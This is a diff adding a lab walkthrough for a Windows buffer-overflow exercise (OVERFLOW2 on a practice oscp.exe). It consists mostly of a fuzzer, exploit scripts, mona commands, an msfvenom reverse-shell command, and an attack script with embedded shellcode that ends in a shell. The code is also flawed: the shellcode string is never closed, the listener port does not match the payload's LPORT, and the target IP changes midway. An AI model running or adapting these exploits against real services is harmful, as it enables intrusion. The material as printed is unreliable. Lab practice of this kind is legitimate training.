@@ -386,3 +386,293 @@ C:\Users\admin\Desktop\vulnerable-apps\oscp> whoami
  whoami
 oscp-bof-prep\admin
 ```
+
+## _OVERFLOW 2 -> 10_
+
+This time around I will modify our two python files `fuzzer.py` and `exploit.py` so that they can accept the values we need to change in them so frequently as arguments. `fuzzer.py` will look like this:
+
+```python3
+#!/usr/bin/env python3
+
+import socket
+import time
+import sys
+import argparse
+
+parser = argparse.ArgumentParser(description="Fuzzing script")
+parser.add_argument("--ip", required=True, help="Target IP address")
+parser.add_argument("--port", type=int, default=1337, help="Target port (default: 1337)")
+parser.add_argument("--prefix", required=True, help="Prefix for the payload")
+args = parser.parse_args()
+
+ip = args.ip
+port = args.port
+prefix = f"OVERFLOW{args.prefix} "
+
+timeout = 5
+string = prefix + "A" * 100
+
+while True:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            s.recv(1024)
+            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+            s.send(bytes(string, "latin-1"))
+            s.recv(1024)
+    except:
+        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+        sys.exit(0)
+    string += 100 * "A"
+    time.sleep(1)
+```
+
+And `exploit.py` should look something like this:
+
+```python3
+#!/usr/bin/env python3
+
+import socket
+import argparse
+
+parser = argparse.ArgumentParser(description="Exploit script")
+parser.add_argument("--ip", required=True, help="Target IP address")
+parser.add_argument("--port", type=int, default=1337, help="Target port (default: 1337)")
+parser.add_argument("--prefix", required=True, help="Prefix before payload")
+parser.add_argument("--offset", type=int, default=0, help="Offset to EIP")
+parser.add_argument("--retn", default="", help="Return address (e.g., '\\xaf\\xbe\\xad\\xde')")
+parser.add_argument("--padding", default="", help="Padding (default: empty)")
+parser.add_argument("--payload", required=True, help="Path to payload file")
+
+args = parser.parse_args()
+
+ip = args.ip
+port = args.port
+prefix = "OVERFLOW" + args.prefix + " "
+offset = args.offset
+retn = args.retn
+padding = args.padding
+
+with open(args.payload, "rb") as f:
+    payload = f.read()  # Read payload as raw bytes
+
+buffer = prefix + "A" * offset + retn + padding + payload.decode("latin-1")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+try:
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(bytes(buffer + "\r\n", "latin-1"))
+    print("Done!")
+except:
+    print("Could not connect.")
+```
+
+Let's define a `targ3t` variable now, to make this easier:
+
+```
+targ3t=10.10.5.252
+```
+
+Now we need to basically restart what we were doing with `OVERFLOW1`. So let's start Immunity Debugger as administrator and open and run `oscp.exe` binary in it. Once that's done, from the host machine let's check if it's working:
+
+```
+nc $targ3t 1337
+HELP
+OVERFLOW2 test
+OVERFLOW2 COMPLETE
+```
+
+Okay, let's use our upgraded fuzzer now, much the same way as we used it with `OVERFLOW1`:
+
+```
+python3 fuzzer.py --ip $targ3t --prefix 2
+```
+
+This fuzzer `... crashed at 700 bytes`, so let's replicate what we did the last time - generate a cyclic pattern of a length `700 + 400`. Only this time we will save it as `payload.txt` to make it work with our upgraded `exploit.py` script:
+
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100 > payload.txt
+```
+
+And after that we go to Immunity Debugger, re-open and re-run `oscp.exe` binary and send the following command:
+
+```
+python3 exploit.py --ip $targ3t --prefix 2 --payload payload.txt
+```
+
+Now we can see that EIP register got overwritten, we need to use `mona` to check where the offset occured:
+
+```
+!mona findmsp -distance 1100
+```
+
+The output for EIP is:
+
+```
+    EIP contains normal pattern : 0x76413176 (offset 634)
+```
+
+So now we know it's 634 bytes. To overwrite the EIP register reliably now, let's set the `retn` variable to `BBBB` and rerun everything with an empty payload:
+
+```
+python3 exploit.py --ip $targ3t --prefix 2 --offset 634 --retn BBBB --payload /dev/null
+```
+
+EIP was successfully overwritten with `BBBB` in hexadecimal: `42424242`
+
+Now let's find the bad characters.
+
+First generate a bytearray with `mona`:
+
+```
+!mona bytearray -b "\x00"
+```
+
+This will generate a bytearray excluding an obvious bad char `\x00`. Let's generate one for us also, but this time, let's use a python script for that, `bytearray.py`:
+
+```python3
+#!/usr/bin/env python3
+
+import sys
+
+def generate_bytearray(excluded_bytes):
+    excluded = bytes.fromhex(excluded_bytes.replace("\\x", "").lower())
+    print("".join(f"\\x{x:02x}" for x in range(256) if x not in excluded))
+
+if __name__ == "__main__":
+    excluded_bytes = sys.argv[1] if len(sys.argv) > 1 else ""
+    generate_bytearray(excluded_bytes)
+```
+
+Now let's generate a bytearray just like we did with `mona` and save it to our `payload.txt`:
+
+```
+python3 bytearray.py "\x00" > payload.txt
+```
+
+Now let's restart `oscp.exe` in Immunity Debugger and run exploit.py script with this new payload:
+
+```
+python3 exploit.py --ip $targ3t --prefix 2 --retn BBBB --offset 634 --payload payload.txt
+```
+
+Now that the buffer is sent, let's copy the address that ESP register is pointing to and use it in the following `mona` command:
+
+```
+!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30
+```
+
+It appears the bad chars identified are `\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb`. Let's update our byte arrays in both places and re-run the commands:
+
+```
+!mona bytearray -b "\x00\x23"
+```
+
+```
+python3 bytearray.py "\x00\x23" > payload.txt
+python3 exploit.py --ip $targ3t --prefix 2 --payload payload.txt
+```
+
+```
+!mona compare -f C:\mona\oscp\bytearray.bin -a 018DFA30
+```
+
+This time, `\x24` didn't show up among bad chars, which means we don't have to test for it anymore! So we do this sequence again, but for `\x00\x23\x3c` and see that `\x3d` didn't show up this time either, so we can move to `\x83` and test for `\x00\x23\x3c\x83` and so on. At the end the bad chars we will end up with are:
+
+```
+\x00\x23\x3c\x83\xba
+```
+
+Now we need to find a jump point using these chars:
+
+```
+!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
+```
+
+Let's copy the first address to the clipboard and reverse it:
+
+```
+625011AF ==> \xaf\x11\x50\x62
+```
+
+This will be our `retn` variable. Now let's generate payload:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c
+```
+
+Now that we know what it is we need to exploit this machine, we can return to the previous exploit script and use it as `attack.py`:
+
+```python3
+import socket
+
+ip = "10.10.208.35"
+port = 1337
+
+prefix = "OVERFLOW2 "
+offset = 634
+overflow = "A" * offset
+retn = "\xaf\x11\x50\x62"
+padding = "\x90" * 16
+payload = (
+"\xfc\xbb\x0f\x20\x4a\x5e\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
+"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf3\xc8\xc8"
+"\x5e\x0b\x09\xad\xd7\xee\x38\xed\x8c\x7b\x6a\xdd\xc7\x29"
+"\x87\x96\x8a\xd9\x1c\xda\x02\xee\x95\x51\x75\xc1\x26\xc9"
+"\x45\x40\xa5\x10\x9a\xa2\x94\xda\xef\xa3\xd1\x07\x1d\xf1"
+"\x8a\x4c\xb0\xe5\xbf\x19\x09\x8e\x8c\x8c\x09\x73\x44\xae"
+"\x38\x22\xde\xe9\x9a\xc5\x33\x82\x92\xdd\x50\xaf\x6d\x56"
+"\xa2\x5b\x6c\xbe\xfa\xa4\xc3\xff\x32\x57\x1d\x38\xf4\x88"
+"\x68\x30\x06\x34\x6b\x87\x74\xe2\xfe\x13\xde\x61\x58\xff"
+"\xde\xa6\x3f\x74\xec\x03\x4b\xd2\xf1\x92\x98\x69\x0d\x1e"
+"\x1f\xbd\x87\x64\x04\x19\xc3\x3f\x25\x38\xa9\xee\x5a\x5a"
+"\x12\x4e\xff\x11\xbf\x9b\x72\x78\xa8\x68\xbf\x82\x28\xe7"
+"\xc8\xf1\x1a\xa8\x62\x9d\x16\x21\xad\x5a\x58\x18\x09\xf4"
+"\xa7\xa3\x6a\xdd\x63\xf7\x3a\x75\x45\x78\xd1\x85\x6a\xad"
+"\x76\xd5\xc4\x1e\x37\x85\xa4\xce\xdf\xcf\x2a\x30\xff\xf0"
+"\xe0\x59\x6a\x0b\x63\x6c\x60\x77\x80\x18\x74\x77\x40\x87"
+"\xf1\x91\xe6\x27\x54\x0a\x9f\xde\xfd\xc0\x3e\x1e\x28\xad"
+"\x01\x94\xdf\x52\xcf\x5d\x95\x40\xb8\xad\xe0\x3a\x6f\xb1"
+"\xde\x52\xf3\x20\x85\xa2\x7a\x59\x12\xf5\x2b\xaf\x6b\x93"
+"\xc1\x96\xc5\x81\x1b\x4e\x2d\x01\xc0\xb3\xb0\x88\x85\x88"
+"\x96\x9a\x53\x10\x93\xce\x0b\x47\x4d\xb8\xed\x31\x3f\x12"
+"\xa4\xee\xe9\xf2\x31\xdd\x29\x84\x3d\x08\xdc\x68\x8f\xe5"
+"\x99\x97\x20\x62\x2e\xe0\x5c\x12\xd1\x3b\xe5\x32\x30\xe9"
+"\x10\xdb\xed\x78\x99\x86\x0d\x57\xde\xbe\x8d\x5d\x9f\x44"
+"\x8d\x14\x9a\x01\x09\xc5\xd6\x1a\xfc\xe9\x45\x1a\xd5\xe9"
+"\x69\xe4\xd6
+)
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+And after re-opening and re-running `oscp.exe`, start a `netcat` listener on host machine and run the exploit:
+
+```
+nc -lvnp 9822
+python3 attack.py
+```
+
+And we get the shell:
+
+```
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\admin\Desktop\vulnerable-apps\oscp>
+```
